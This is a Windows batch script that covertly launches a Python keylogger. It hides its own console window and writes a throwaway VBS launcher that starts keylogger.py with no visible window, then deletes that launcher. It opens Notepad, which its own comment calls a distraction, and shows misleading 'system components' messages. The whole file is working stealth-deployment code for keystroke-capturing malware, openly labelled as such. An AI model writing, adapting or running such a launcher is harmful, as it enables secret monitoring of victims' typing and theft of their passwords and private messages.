@echo off
setlocal EnableDelayedExpansion

:: Hide the command window
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

:: Set working directory to the batch file location
cd /d "%~dp0"

:: Check if Python is installed
python --version > nul 2>&1
if %errorlevel% neq 0 (
    :: Python not found - show error but continue anyway
    echo Python not found. Attempting to work with system resources...
    timeout /t 2 /nobreak > nul
)

:: Check if we have all necessary files
if not exist keylogger.py (
    echo System components missing. Please reinstall.
    timeout /t 3 /nobreak > nul
    exit /b 1
)

:: Create and run the VBS launcher
echo Creating launcher...
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo strDirectory = "%~dp0"
echo strCommand = "pythonw.exe " ^& Chr^(34^) ^& strDirectory ^& "keylogger.py" ^& Chr^(34^)
echo WshShell.Run strCommand, 0, False
) > "temp_launcher.vbs"

:: Run the VBS file
start /b "" wscript.exe temp_launcher.vbs

:: Wait a moment to ensure the VBS launches the keylogger
timeout /t 2 /nobreak > nul

:: Delete the temporary VBS file
del temp_launcher.vbs

:: Open a distraction - can be notepad or another innocuous program
start notepad

:: Create a log file to show success (for testing)
echo Keylogger launched successfully at %date% %time% > keylogger_launcher.log

:: Exit silently
exit 